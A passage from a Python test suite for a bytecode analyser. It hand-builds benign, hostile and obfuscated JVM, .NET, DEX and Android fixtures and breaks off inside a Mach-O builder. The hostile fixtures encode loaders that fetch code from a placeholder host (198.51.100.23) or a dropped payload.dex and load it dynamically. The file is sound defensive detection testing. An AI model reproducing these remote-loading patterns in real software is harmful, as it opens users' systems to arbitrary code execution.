"""Coverage wave 2 tests: bytecode accounted at method level.

Synthetic fixtures only, every one hand-built in this file from the
format specifications (JVM class file, ECMA-335 metadata and IL,
DEX, binary AndroidManifest.xml, Mach-O and fat Mach-O). No compiler
toolchain exists in this environment and no sample was downloaded.
See validation/COVERAGE-WAVE-2-LOG.md for the diagnosis, the exact
parser depth per class, and the named remainder.

Per class: a benign control that can reach NO when fully accounted,
a hostile shape (fetch-execute, dynamic loading of an absent target)
that cannot reach NO with the reason named, and a truncated or
obfuscated fixture that caps by name."""
import io
import os
import struct
import sys
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero.verdict import verdict
from event_zero.bytecode import (parse_class_file, parse_jar, parse_dotnet_il,
                                 parse_dex, parse_axml, parse_macho,
                                 split_macho_fat, bytecode_report)


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


def blockers_text(v):
    return "\n".join(v.get("blockers") or []) + "\n" + \
        "\n".join(u for u in v.get("unaccounted") or [])


# ======================================================================
# Fixture builders: JVM class files and JARs
# ======================================================================

class CP:
    def __init__(self):
        self.entries = [None]  # 1-based
        self._cache = {}

    def _add(self, key, blob):
        if key in self._cache:
            return self._cache[key]
        idx = len(self.entries)
        self.entries.append(blob)
        if key[0] in ("long", "double"):
            self.entries.append(None)
        self._cache[key] = idx
        return idx

    def utf8(self, s):
        b = s.encode("utf-8")
        return self._add(("u", s), b"\x01" + struct.pack(">H", len(b)) + b)

    def class_(self, name):
        return self._add(("c", name), b"\x07" + struct.pack(">H", self.utf8(name)))

    def string(self, s):
        return self._add(("s", s), b"\x08" + struct.pack(">H", self.utf8(s)))

    def nat(self, name, desc):
        return self._add(("nt", name, desc), b"\x0c" + struct.pack(">HH", self.utf8(name), self.utf8(desc)))

    def methodref(self, cls, name, desc):
        return self._add(("mr", cls, name, desc), b"\x0a" + struct.pack(">HH", self.class_(cls), self.nat(name, desc)))

    def fieldref(self, cls, name, desc):
        return self._add(("fr", cls, name, desc), b"\x09" + struct.pack(">HH", self.class_(cls), self.nat(name, desc)))

    def bytes(self):
        return b"".join(e for e in self.entries if e is not None)

    def count(self):
        return len(self.entries)


def _class_shell(cp, this_idx, super_idx, methods):
    code_attr = cp.utf8("Code")
    out = io.BytesIO()
    out.write(b"\xca\xfe\xba\xbe" + struct.pack(">HH", 0, 52))
    body = io.BytesIO()
    body.write(struct.pack(">HHH", 0x0021, this_idx, super_idx))
    body.write(struct.pack(">HH", 0, 0))
    body.write(struct.pack(">H", len(methods)))
    for access, n, d, ms, ml, code in methods:
        attr = struct.pack(">HHI", ms, ml, len(code)) + code + struct.pack(">H", 0) + struct.pack(">H", 0)
        body.write(struct.pack(">HHHH", access, n, d, 1))
        body.write(struct.pack(">HI", code_attr, len(attr)) + attr)
    body.write(struct.pack(">H", 0))
    return out.getvalue() + struct.pack(">H", cp.count()) + cp.bytes() + body.getvalue()


def benign_class():
    cp = CP()
    this_idx = cp.class_("com/example/Hello")
    super_idx = cp.class_("java/lang/Object")
    init_name = cp.utf8("<init>")
    void_desc = cp.utf8("()V")
    greet_name = cp.utf8("greet")
    greet_desc = cp.utf8("()Ljava/lang/String;")
    hello_str = cp.string("hello world")
    init_ref = cp.methodref("java/lang/Object", "<init>", "()V")
    init_code = bytes([0x2a, 0xb7]) + struct.pack(">H", init_ref) + bytes([0xb1])
    greet_code = bytes([0x12, hello_str, 0xb0])
    return _class_shell(cp, this_idx, super_idx, [
        (0x0001, init_name, void_desc, 1, 1, init_code),
        (0x0009, greet_name, greet_desc, 1, 0, greet_code)])


def hostile_class():
    cp = CP()
    this_idx = cp.class_("com/example/Loader")
    super_idx = cp.class_("java/lang/Object")
    init_name = cp.utf8("<init>")
    void_desc = cp.utf8("()V")
    load_name = cp.utf8("load")
    load_desc = cp.utf8("()V")
    url_str = cp.string("http://198.51.100.23/plugin.jar")
    plugin_str = cp.string("evil.Plugin")
    init_ref = cp.methodref("java/lang/Object", "<init>", "()V")
    url_class = cp.class_("java/net/URL")
    url_init = cp.methodref("java/net/URL", "<init>", "(Ljava/lang/String;)V")
    open_stream = cp.methodref("java/net/URL", "openStream", "()Ljava/io/InputStream;")
    ucl_new = cp.methodref("java/net/URLClassLoader", "newInstance",
                           "([Ljava/net/URL;Ljava/lang/ClassLoader;)Ljava/net/URLClassLoader;")
    load_class = cp.methodref("java/lang/ClassLoader", "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;")
    init_code = bytes([0x2a, 0xb7]) + struct.pack(">H", init_ref) + bytes([0xb1])
    code = io.BytesIO()
    code.write(bytes([0xbb]) + struct.pack(">H", url_class))
    code.write(bytes([0x59, 0x12, url_str]))
    code.write(bytes([0xb7]) + struct.pack(">H", url_init))
    code.write(bytes([0x59]))
    code.write(bytes([0xb6]) + struct.pack(">H", open_stream))
    code.write(bytes([0x57, 0x57]))
    code.write(bytes([0x01, 0x01]))
    code.write(bytes([0xb8]) + struct.pack(">H", ucl_new))
    code.write(bytes([0x12, plugin_str]))
    code.write(bytes([0xb6]) + struct.pack(">H", load_class))
    code.write(bytes([0x57, 0xb1]))
    return _class_shell(cp, this_idx, super_idx, [
        (0x0001, init_name, void_desc, 1, 1, init_code),
        (0x0009, load_name, load_desc, 4, 1, code.getvalue())])


def build_jar(members, manifest=b"Manifest-Version: 1.0\r\nMain-Class: com.example.Hello\r\n\r\n",
              signer=False):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("META-INF/MANIFEST.MF", manifest)
        if signer:
            z.writestr("META-INF/CERT.SF", b"Signature-Version: 1.0\r\nSHA-256-Digest-Manifest: AAAA\r\n\r\n")
            z.writestr("META-INF/CERT.RSA", b"\x30\x82\x01\x00fake-signature-block")
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


# ======================================================================
# Fixture builders: .NET assemblies (hand-built PE32 + ECMA-335)
# ======================================================================

def _comp(n):
    if n < 0x80:
        return bytes([n])
    if n < 0x4000:
        return struct.pack(">H", n | 0x8000)
    return struct.pack(">I", n | 0xC0000000)


class Heaps:
    def __init__(self):
        self.strings = bytearray(b"\x00")
        self._smap = {"": 0}
        self.us = bytearray(b"\x00")
        self._umap = {}
        self.blob = bytearray(b"\x00")
        self._bmap = {}
        self.guid = bytearray(16)

    def s(self, v):
        if v not in self._smap:
            self._smap[v] = len(self.strings)
            self.strings += v.encode("utf-8") + b"\x00"
        return self._smap[v]

    def u(self, v):
        if v not in self._umap:
            data = v.encode("utf-16le")
            self._umap[v] = len(self.us)
            self.us += _comp(len(data) + 1) + data + b"\x00"
        return self._umap[v]

    def b(self, data):
        data = bytes(data)
        if data not in self._bmap:
            self._bmap[data] = len(self.blob)
            self.blob += _comp(len(data)) + data
        return self._bmap[data]


def sig_method(params, ret, hasthis=False):
    out = bytearray([0x20 if hasthis else 0x00]) + _comp(len(params))
    out += bytes([ret]) if isinstance(ret, int) else bytes(ret)
    for p in params:
        out += bytes([p]) if isinstance(p, int) else bytes(p)
    return bytes(out)


def sig_field(t):
    return bytes([0x06]) + (bytes([t]) if isinstance(t, int) else bytes(t))


T_VOID, T_BOOL, T_I4, T_STRING, T_OBJECT = 0x01, 0x02, 0x08, 0x0e, 0x1c


def t_class(coded):
    return bytes([0x12]) + _comp(coded)


def t_sarray(elem):
    return bytes([0x1d, elem])


def build_dotnet(variant="benign"):
    """Variants: benign, hostile (WebClient.DownloadString feeding
    Assembly.Load of a remote URL string), obfuscated (encrypted
    string store with integer-key call sites, a control-flow
    flattening switch, a MulticastDelegate proxy type), resource
    (benign plus a text resource), badresource (benign plus a binary
    resource that is neither text nor an assembly)."""
    h = Heaps()

    def coded_typedeforref(tag, row):
        return (row << 2) | tag

    def coded_memberrefparent(tag, row):
        return (row << 3) | tag

    def coded_resolutionscope(tag, row):
        return (row << 2) | tag

    methods = []
    typedefs = []
    fields = []
    resources = []
    us_hello = h.u("hello from a benign assembly")
    us_url = h.u("http://198.51.100.23/payload.dll") if variant == "hostile" else 0

    if variant == "benign" or variant in ("resource", "badresource"):
        il_main = bytes([0x72]) + struct.pack("<I", 0x70000000 | us_hello) + \
            bytes([0x28]) + struct.pack("<I", 0x0A000001) + bytes([0x2a])
        methods.append(("Main", sig_method([], T_VOID), il_main, 0, 0x0096))
        typedefs.append(("Program", "BenignApp", coded_typedeforref(1, 1), 1))
        if variant == "resource":
            resources.append(("notes.txt", b"release notes for the benign assembly\n"))
        if variant == "badresource":
            resources.append(("payload.bin", bytes(range(256)) * 2))
    elif variant == "hostile":
        il = io.BytesIO()
        il.write(bytes([0x73]) + struct.pack("<I", 0x0A000002))
        il.write(bytes([0x25]))
        il.write(bytes([0x72]) + struct.pack("<I", 0x70000000 | us_url))
        il.write(bytes([0x6f]) + struct.pack("<I", 0x0A000003))
        il.write(bytes([0x28]) + struct.pack("<I", 0x0A000004))
        il.write(bytes([0x26, 0x2a]))
        methods.append(("Run", sig_method([], T_VOID), il.getvalue(), 0, 0x0096))
        typedefs.append(("Stealer", "HostileApp", coded_typedeforref(1, 1), 1))
    elif variant == "obfuscated":
        fields.append(("data", sig_field(t_sarray(0x05)), 0x0006))
        il_store = io.BytesIO()
        il_store.write(bytes([0x02]))
        il_store.write(bytes([0x7e]) + struct.pack("<I", 0x04000001))
        il_store.write(bytes([0x20]) + struct.pack("<i", 0x5a))
        il_store.write(bytes([0x61]))
        il_store.write(bytes([0x26]))
        il_store.write(bytes([0x14, 0x2a]))
        methods.append(("a", sig_method([T_I4], T_STRING), il_store.getvalue(), 0, 0x0096))
        il_call = io.BytesIO()
        il_call.write(bytes([0x1f, 0x07]))
        il_call.write(bytes([0x28]) + struct.pack("<I", 0x06000001))
        il_call.write(bytes([0x26]))
        il_call.write(bytes([0x20]) + struct.pack("<i", 42))
        il_call.write(bytes([0x28]) + struct.pack("<I", 0x06000001))
        il_call.write(bytes([0x26, 0x2a]))
        methods.append(("b", sig_method([], T_VOID), il_call.getvalue(), 0, 0x0096))
        il_sw = io.BytesIO()
        il_sw.write(bytes([0x16]))
        sw_at = il_sw.tell()
        il_sw.write(bytes([0x45]) + struct.pack("<I", 5))
        il_sw.write(b"".join(struct.pack("<i", 0) for _ in range(5)))
        il_sw.write(bytes([0x2a]))
        methods.append(("c", sig_method([], T_VOID), il_sw.getvalue(), 0, 0x0096))
        typedefs.append(("xQz", "", coded_typedeforref(1, 1), 1))
        typedefs.append(("d", "", coded_typedeforref(1, 5), 0))
    else:
        raise ValueError(variant)

    td_rows = [(0, h.s("<Module>"), 0, 0, 1, 1)]
    for name, ns, ext, firstm in typedefs:
        ml = firstm if firstm else len(methods) + 1
        td_rows.append((0x00100001 if name == "d" else 0x00000001, h.s(name), h.s(ns), ext, 1, ml))
    tr_rows = []
    for nm, ns in [("Object", "System"), ("Console", "System"), ("WebClient", "System.Net"),
                   ("Assembly", "System.Reflection"), ("MulticastDelegate", "System")]:
        tr_rows.append((coded_resolutionscope(2, 1), h.s(nm), h.s(ns)))
    _mr_builders = {
        0: lambda: (coded_memberrefparent(1, 2), h.s("WriteLine"), h.b(sig_method([T_STRING], T_VOID))),
        1: lambda: (coded_memberrefparent(1, 3), h.s(".ctor"), h.b(sig_method([], T_VOID, hasthis=True))),
        2: lambda: (coded_memberrefparent(1, 3), h.s("DownloadString"), h.b(sig_method([T_STRING], T_STRING, hasthis=True))),
        3: lambda: (coded_memberrefparent(1, 4), h.s("Load"), h.b(sig_method([T_STRING], t_class(coded_typedeforref(1, 4))))),
    }
    if variant == "hostile":
        mr_rows = [_mr_builders[i]() for i in range(4)]
    elif variant in ("benign", "resource", "badresource"):
        mr_rows = [_mr_builders[0]()]
    else:
        mr_rows = []
    field_rows = [(fl, h.s(nm), h.b(sg)) for nm, sg, fl in fields]
    asm_name = {"benign": "BenignApp", "hostile": "HostileApp", "obfuscated": "ObfuscatedApp",
                "resource": "BenignApp", "badresource": "BenignApp"}[variant]
    tables = {}
    tables[0] = [struct.pack("<HHHHH", 0, h.s(asm_name + ".dll"), 1, 0, 0)]
    tables[1] = [struct.pack("<HHH", sc, nm, ns) for sc, nm, ns in tr_rows]
    tables[2] = [struct.pack("<IHHHHH", fl, nm, ns, ex, fld, mtd) for fl, nm, ns, ex, fld, mtd in td_rows]
    if field_rows:
        tables[4] = [struct.pack("<HHH", fl, nm, sg) for fl, nm, sg in field_rows]
    tables[32] = [struct.pack("<IHHHHIHHH", 0x8004, 1, 0, 0, 0, 0, h.b(b""), h.s(asm_name), 0)]
    tables[35] = [struct.pack("<HHHHIHHHH", 4, 0, 0, 0, 0, h.b(b""), h.s("mscorlib"), 0, h.b(b""))]
    if mr_rows:
        tables[10] = [struct.pack("<HHH", c, n, s) for c, n, s in mr_rows]
    bodies = []
    for name, sg, il, implf, flags in methods:
        assert len(il) < 64
        bodies.append(bytes([(len(il) << 2) | 0x2]) + il)
    return _assemble_pe(h, tables, methods, bodies, resources)


def _assemble_pe(h, tables, methods, bodies, resources):
    res_blob = bytearray()
    res_offsets = []
    for name, data in resources:
        res_offsets.append(len(res_blob))
        res_blob += struct.pack("<I", len(data)) + data
    method_rvas = [0] * len(methods)
    for _pass in range(2):
        md_rows = []
        for i, (name, sg, il, implf, flags) in enumerate(methods):
            md_rows.append(struct.pack("<IHHHHH", method_rvas[i], implf, flags, h.s(name), h.b(sg), 1))
        tables[6] = md_rows
        if resources:
            tables[40] = [struct.pack("<IIHH", off, 0x0001, h.s(nm), 0)
                          for (nm, _d), off in zip(resources, res_offsets)]
        present = sorted(tables.keys())
        valid = 0
        for t in present:
            valid |= (1 << t)
        tilde = io.BytesIO()
        tilde.write(struct.pack("<I", 0) + bytes([2, 0, 0x00, 1]))
        tilde.write(struct.pack("<Q", valid) + struct.pack("<Q", 0))
        for t in present:
            tilde.write(struct.pack("<I", len(tables[t])))
        for t in present:
            for row in tables[t]:
                tilde.write(row)
        streams = [(b"#~", tilde.getvalue()), (b"#Strings", bytes(h.strings)),
                   (b"#US", bytes(h.us)), (b"#Blob", bytes(h.blob)), (b"#GUID", bytes(h.guid))]
        root = io.BytesIO()
        root.write(struct.pack("<IHHI", 0x424A5342, 1, 1, 0))
        ver = b"v4.0.30319\x00\x00"
        root.write(struct.pack("<I", 12) + ver[:12])
        root.write(struct.pack("<H", 0) + struct.pack("<H", len(streams)))
        hdr_size = root.tell() + sum(8 + ((len(nm) + 1 + 3) & ~3) for nm, _ in streams)
        off = hdr_size
        sh = io.BytesIO()
        for nm, data in streams:
            sh.write(struct.pack("<II", off, len(data)))
            padded = nm + b"\x00"
            padded += b"\x00" * ((4 - len(padded) % 4) % 4)
            sh.write(padded)
            off += len(data)
        metadata = root.getvalue() + sh.getvalue() + b"".join(d for _n, d in streams)
        md_size = len(metadata)
        body_start_rva = 0x1000 + 72 + md_size
        body_start_rva = (body_start_rva + 3) & ~3
        rvas = []
        cur = body_start_rva
        for b in bodies:
            rvas.append(cur)
            cur += len(b)
        res_rva = (cur + 3) & ~3 if resources else 0
        if rvas == method_rvas and _pass == 1:
            method_rvas = rvas
            break
        method_rvas = rvas
    sec = io.BytesIO()
    clr = io.BytesIO()
    md_rva = 0x1000 + 72
    res_size = len(res_blob)
    clr.write(struct.pack("<IHH", 72, 2, 5))
    clr.write(struct.pack("<II", md_rva, md_size))
    clr.write(struct.pack("<II", 0x0001, 0x06000001))
    clr.write(struct.pack("<II", res_rva, res_size))
    clr.write(struct.pack("<II", 0, 0))
    clr.write(struct.pack("<II", 0, 0))
    clr.write(struct.pack("<II", 0, 0))
    clr.write(struct.pack("<II", 0, 0))
    clr.write(struct.pack("<II", 0, 0))
    assert clr.tell() == 72
    sec.write(clr.getvalue())
    sec.write(metadata)
    while sec.tell() < body_start_rva - 0x1000:
        sec.write(b"\x00")
    for b in bodies:
        sec.write(b)
    while resources and sec.tell() < res_rva - 0x1000:
        sec.write(b"\x00")
    if resources:
        sec.write(bytes(res_blob))
    section = sec.getvalue()
    raw_size = (len(section) + 0x1ff) & ~0x1ff
    section = section.ljust(raw_size, b"\x00")
    out = io.BytesIO()
    out.write(b"MZ" + b"\x00" * 0x3a + struct.pack("<I", 0x80) + b"\x00" * (0x80 - 0x40))
    out.write(b"PE\x00\x00")
    out.write(struct.pack("<HHIIIHH", 0x14c, 1, 0, 0, 0, 224, 0x0102))
    opt = io.BytesIO()
    opt.write(struct.pack("<HBB", 0x10b, 0, 0))
    opt.write(struct.pack("<III", len(section), 0, 0))
    opt.write(struct.pack("<II", 0x1000, 0x1000))
    opt.write(struct.pack("<I", 0x2000))
    opt.write(struct.pack("<I", 0x400000))
    opt.write(struct.pack("<II", 0x1000, 0x200))
    opt.write(struct.pack("<HHHHHH", 4, 0, 0, 0, 4, 0))
    opt.write(struct.pack("<I", 0))
    opt.write(struct.pack("<I", 0x2000))
    opt.write(struct.pack("<I", 0x200))
    opt.write(struct.pack("<I", 0))
    opt.write(struct.pack("<HH", 3, 0x8540))
    opt.write(struct.pack("<IIIIII", 0x100000, 0x1000, 0x100000, 0x1000, 0, 16))
    dirs = [(0, 0)] * 16
    dirs[14] = (0x1000, 72)
    for rva, size in dirs:
        opt.write(struct.pack("<II", rva, size))
    assert opt.tell() == 224, opt.tell()
    out.write(opt.getvalue())
    out.write(b".text\x00\x00\x00" + struct.pack("<IIIIIIHHI", len(section), 0x1000, raw_size, 0x200, 0, 0, 0, 0, 0x60000020))
    out.write(b"\x00" * (0x200 - out.tell()))
    out.write(section)
    return out.getvalue()


# ======================================================================
# Fixture builders: DEX, binary AndroidManifest.xml, Mach-O
# ======================================================================

def _uleb(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def build_dex(classes, truncate_code=False):
    """classes: list of {name, super, methods: [(name, shorty, ret,
    params, access, regs, insns-or-callable, refs)]}. A callable insns
    receives a resolver R with .method/.type/.string/.field."""
    strings = []

    def sidx(s):
        if s not in strings:
            strings.append(s)
        return strings.index(s)

    types = []

    def tidx(t):
        if t not in types:
            types.append(t)
        return types.index(t)

    protos = []

    def pidx(shorty, ret, params):
        key = (shorty, ret, tuple(params))
        if key not in protos:
            protos.append(key)
        return protos.index(key)

    methods_ids = []

    def midx(cls, proto, name):
        key = (cls, proto, name)
        if key not in methods_ids:
            methods_ids.append(key)
        return methods_ids.index(key)

    fields_ids = []
    for c in classes:
        tidx(c["name"])
        tidx(c["super"])
        for m in c["methods"]:
            pidx(m["shorty"], m["ret"], m["params"])
            for p in m["params"]:
                tidx(p)
            tidx(m["ret"])
            midx(c["name"], pidx(m["shorty"], m["ret"], m["params"]), m["name"])
            for ref in m.get("refs", []):
                kind = ref[0]
                if kind == "method":
                    midx(ref[1], pidx(ref[3], ref[4], ref[5]), ref[2])
                    tidx(ref[4])
                    for _p in ref[5]:
                        tidx(_p)
                elif kind == "type":
                    tidx(ref[1])
                elif kind == "string":
                    sidx(ref[1])
                elif kind == "field":
                    key = (ref[1], ref[3], ref[2])
                    if key not in fields_ids:
                        fields_ids.append(key)

    class _R:
        def method(self, cls, name, shorty, ret, params):
            tidx(ret)
            for _p in params:
                tidx(_p)
            return midx(cls, pidx(shorty, ret, params), name)

        def type(self, t):
            return tidx(t)

        def string(self, s):
            return sidx(s)

        def field(self, cls, name, ty):
            key = (cls, ty, name)
            if key not in fields_ids:
                fields_ids.append(key)
            return fields_ids.index(key)

    # Two-pass instruction resolution. The DEX specification
    # requires string_ids sorted, and every const-string operand
    # indexes that sorted table; the resolver above registers
    # strings in encounter order, so operands baked in on the
    # first pass would index the wrong strings. Pass one runs each
    # callable only to discover every string it references; the
    # sorted map is then built, and pass two re-resolves with a
    # resolver whose string indices are the sorted-table indices.
    _fns = {}
    for ci, c in enumerate(classes):
        for mi, m in enumerate(c["methods"]):
            if callable(m["insns"]):
                _fns[(ci, mi)] = m["insns"]
                m["insns"] = m["insns"](_R())
            m.setdefault("insns_size", len(m["insns"]))
    for t in list(types):
        sidx(t)
    for (sh, r, ps) in protos:
        sidx(sh)
    for (cl, pr, nm) in methods_ids:
        sidx(nm)
    for c in classes:
        sidx(c["name"])
    strings_sorted = sorted(set(strings))
    smap = {s: i for i, s in enumerate(strings_sorted)}
    tmap = {t: i for i, t in enumerate(types)}

    class _R2(_R):
        def string(self, s):
            return smap[s]

    for (_ci, _mi), _fn in _fns.items():
        classes[_ci]["methods"][_mi]["insns"] = _fn(_R2())
    header_size = 112
    nstr, ntype, nproto = len(strings_sorted), len(types), len(protos)
    nfield, nmethod = len(fields_ids), len(methods_ids)
    off = header_size
    string_ids_off = off
    off += 4 * nstr
    type_ids_off = off
    off += 4 * ntype
    proto_ids_off = off
    off += 12 * nproto
    field_ids_off = off
    off += 8 * nfield
    method_ids_off = off
    off += 8 * nmethod
    class_defs_off = off
    off += 32 * len(classes)
    data_off = off
    sd = io.BytesIO()
    soff_map = {}
    for s in strings_sorted:
        soff_map[s] = data_off + sd.tell()
        b = s.encode("utf-8")
        sd.write(_uleb(len(b)) + b + b"\x00")
    tl = io.BytesIO()
    tl_off_map = {}
    for (sh, r, ps) in protos:
        if ps:
            while (data_off + len(sd.getvalue()) + tl.tell()) % 4:
                tl.write(b"\x00")
            tl_off_map[(sh, r, ps)] = data_off + len(sd.getvalue()) + tl.tell()
            tl.write(struct.pack("<I", len(ps)) + b"".join(struct.pack("<H", tmap[p]) for p in ps))
    code_region = io.BytesIO()
    cd_region = io.BytesIO()
    code_base = data_off + len(sd.getvalue()) + len(tl.getvalue())
    code_off_map = {}
    class_defs = [(c, c["methods"]) for c in classes]
    for ci, (c, ms) in enumerate(class_defs):
        for mi, m in enumerate(ms):
            while (code_base + len(code_region.getvalue())) % 4:
                code_region.write(b"\x00")
            here = code_base + len(code_region.getvalue())
            insns = m["insns"]
            if truncate_code and ci == 0 and mi == 0:
                insns = insns[:1]
            code_off_map[(ci, mi)] = here
            code_region.write(struct.pack("<HHHHII", m.get("regs", 4), 1, 1, 0, 0, m["insns_size"]))
            code_region.write(b"".join(struct.pack("<H", u) for u in insns))
    cd_base = code_base + len(code_region.getvalue())
    cd_offsets = []
    for ci, (c, ms) in enumerate(class_defs):
        cd_offsets.append(cd_base + len(cd_region.getvalue()))
        cd_region.write(_uleb(0) + _uleb(0) + _uleb(len(ms)) + _uleb(0))
        prev = 0
        for mi, m in enumerate(ms):
            mid = midx(c["name"], pidx(m["shorty"], m["ret"], m["params"]), m["name"])
            cd_region.write(_uleb(mid - prev) + _uleb(m["access"]) + _uleb(code_off_map[(ci, mi)]))
            prev = mid
    data_section = sd.getvalue() + tl.getvalue() + code_region.getvalue() + cd_region.getvalue()
    out = io.BytesIO()
    out.write(b"dex\n035\x00" + b"\x00" * 24)
    file_size = data_off + len(data_section)
    out.write(struct.pack("<I", file_size))
    out.write(struct.pack("<I", header_size) + struct.pack("<I", 0x12345678))
    out.write(struct.pack("<II", 0, 0))
    out.write(struct.pack("<I", 0))
    out.write(struct.pack("<II", nstr, string_ids_off))
    out.write(struct.pack("<II", ntype, type_ids_off))
    out.write(struct.pack("<II", nproto, proto_ids_off))
    out.write(struct.pack("<II", nfield, field_ids_off))
    out.write(struct.pack("<II", nmethod, method_ids_off))
    out.write(struct.pack("<II", len(classes), class_defs_off))
    out.write(struct.pack("<II", len(data_section), data_off))
    assert out.tell() == 112, out.tell()
    for s in strings_sorted:
        out.write(struct.pack("<I", soff_map[s]))
    for t in types:
        out.write(struct.pack("<I", smap[t]))
    for (sh, r, ps) in protos:
        out.write(struct.pack("<III", smap[sh], tmap[r], tl_off_map.get((sh, r, ps), 0)))
    for (cl, ty, nm) in fields_ids:
        out.write(struct.pack("<HHI", tmap[cl], tmap[ty], smap[nm]))
    for (cl, pr, nm) in methods_ids:
        out.write(struct.pack("<HHI", tmap[cl], pr, smap[nm]))
    for ci, (c, ms) in enumerate(class_defs):
        out.write(struct.pack("<IIIIIIII", tmap[c["name"]], 0x1, tmap[c["super"]], 0, 0xffffffff, 0, cd_offsets[ci], 0))
    out.write(data_section)
    return out.getvalue()


def op_const_string(reg, idx):
    return [0x001a | (reg << 8), idx]


def op_invoke(kind_op, method_idx, regs_word):
    return [kind_op | (regs_word[0] << 12) | (regs_word[1] << 8), method_idx, regs_word[2]]


def op_return_void():
    return [0x000e]


def op_return_object(reg):
    return [0x0011 | (reg << 8)]


def op_new_instance(reg, type_idx):
    return [0x0022 | (reg << 8), type_idx]


def op_move_result_object(reg):
    return [0x000c | (reg << 8)]


ANDROID_NS = "http://schemas.android.com/apk/res/android"


def build_axml(package="com.example.app", permissions=("android.permission.INTERNET",),
               components=(("activity", ".MainActivity", True),)):
    strings = []

    def sidx(s):
        if s not in strings:
            strings.append(s)
        return strings.index(s)

    ANDROID = sidx(ANDROID_NS)

    def attr(name, value):
        return (ANDROID, sidx(name), sidx(value), 0x03, sidx(value))

    def elem(name, attrs, children=()):
        # Element names must enter the string pool while the tree
        # is being built: the pool is serialised from `strings`
        # before emit() runs, so a name first registered inside
        # emit() would be missing from the pool and every element
        # tag index would point past its end.
        sidx(name)
        return (name, attrs, children)

    tree = elem("manifest", [(0xffffffff, sidx("package"), sidx(package), 0x03, sidx(package))], [
        *[elem("uses-permission", [attr("name", p)]) for p in permissions],
        elem("application", [], [
            elem(kind, [attr("name", nm),
                        (ANDROID, sidx("exported"), 0xffffffff, 0x12, 0xffffffff if exp else 0)])
            for kind, nm, exp in components]),
    ])
    body = io.BytesIO()
    offs = []
    for s in strings:
        offs.append(body.tell())
        b = s.encode("utf-16le")
        body.write(struct.pack("<H", len(s)) + b + b"\x00\x00")
    pool = io.BytesIO()
    pool.write(struct.pack("<HHIIIIII", 0x0001, 28, 28 + 4 * len(strings) + len(body.getvalue()),
                           len(strings), 0, 0, 28 + 4 * len(strings), 28 + 4 * len(strings)))
    for o in offs:
        pool.write(struct.pack("<I", o))
    pool.write(body.getvalue())
    chunks = io.BytesIO()

    def emit(node):
        name, attrs, children = node
        chunks.write(struct.pack("<HHI", 0x0102, 16, 16 + 20 + 20 * len(attrs)))
        chunks.write(struct.pack("<II", 0, 0xffffffff))
        chunks.write(struct.pack("<II", 0xffffffff, sidx(name)))
        chunks.write(struct.pack("<HHHHHH", 20, 20, len(attrs), 0, 0, 0))
        for ns, nm, raw, dtype, data in attrs:
            chunks.write(struct.pack("<III", ns, nm, raw))
            chunks.write(struct.pack("<HBBI", 8, 0, dtype, data))
        for ch in children:
            emit(ch)
        chunks.write(struct.pack("<HHI", 0x0103, 16, 24))
        chunks.write(struct.pack("<II", 0, 0xffffffff))
        chunks.write(struct.pack("<II", 0xffffffff, sidx(name)))

    emit(tree)
    total = 8 + len(pool.getvalue()) + len(chunks.getvalue())
    return struct.pack("<HHI", 0x0003, 8, total) + pool.getvalue() + chunks.getvalue()


def build_apk(manifest_bytes, dex_bytes, extra=None):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("AndroidManifest.xml", manifest_bytes)
        z.writestr("classes.dex", dex_bytes)
        for k, v in (extra or {}).items():
            z.writestr(k, v)
    return buf.getvalue()


def benign_dex():
    def greet_insns(R):
        s = R.string("hello from dex")
        return op_const_string(0, s) + op_return_object(0)
    return build_dex([{
        "name": "Lcom/example/MainActivity;", "super": "Landroid/app/Activity;",
        "methods": [{"name": "greet", "shorty": "L", "ret": "Ljava/lang/String;", "params": [],
                     "access": 0x0009, "regs": 2, "insns": greet_insns,
                     "refs": [("string", "hello from dex")]}],
    }])


def hostile_dex():
    def load_insns(R):
        path = R.string("/data/data/com.example.app/files/payload.dex")
        cls = R.string("evil.Payload")
        t_loader = R.type("Ldalvik/system/DexClassLoader;")
        m_init = R.method("Ldalvik/system/DexClassLoader;", "<init>", "V", "V",
                          ["Ljava/lang/String;", "Ljava/lang/String;", "Ljava/lang/String;", "Ljava/lang/ClassLoader;"])
        m_load = R.method("Ldalvik/system/DexClassLoader;", "loadClass", "L", "Ljava/lang/Class;",
                          ["Ljava/lang/String;"])
        m_forname = R.method("Ljava/lang/Class;", "forName", "L", "Ljava/lang/Class;", ["Ljava/lang/String;"])
        units = []
        units += op_new_instance(0, t_loader)
        units += op_const_string(1, path)
        units += op_invoke(0x70, m_init, (4, 0, 0x3210))
        units += op_const_string(1, cls)
        units += op_invoke(0x6e, m_load, (2, 0, 0x10))
        units += op_move_result_object(0)
        units += op_const_string(1, cls)
        units += op_invoke(0x71, m_forname, (1, 0, 0x10))
        units += op_return_void()
        return units
    return build_dex([{
        "name": "Lcom/example/Loader;", "super": "Ljava/lang/Object;",
        "methods": [{"name": "load", "shorty": "V", "ret": "V", "params": [],
                     "access": 0x0009, "regs": 4, "insns": load_insns,
                     "refs": [("type", "Ldalvik/system/DexClassLoader;"),
                              ("string", "/data/data/com.example.app/files/payload.dex"),
                              ("string", "evil.Payload")]}],
    }])


def benign_apk():
    # The manifest package must be the package the DEX class
    # actually lives in (com.example, for Lcom/example/MainActivity;):
    # with the default com.example.app the manifest would genuinely
    # declare a component with no code behind it, and the verdict
    # would be right to cap it.
    return build_apk(build_axml(package="com.example"), benign_dex())


def hostile_apk():
    man = build_axml(components=(("activity", ".MainActivity", True),
                                 ("service", ".LoaderService", True)))
    return build_apk(man, hostile_dex())


def build_macho_thin(arch="arm64", text=b"\x00\x00\x80\xd2\xc0\x03\x5f\xd6", strings=b"",
                     entitlements=None, adhoc=False, bad_sig=False):
    cputype = 0x0100000c if arch == "arm64" else 0x01000007
    cmds = io.BytesIO()
    seg = io.BytesIO()
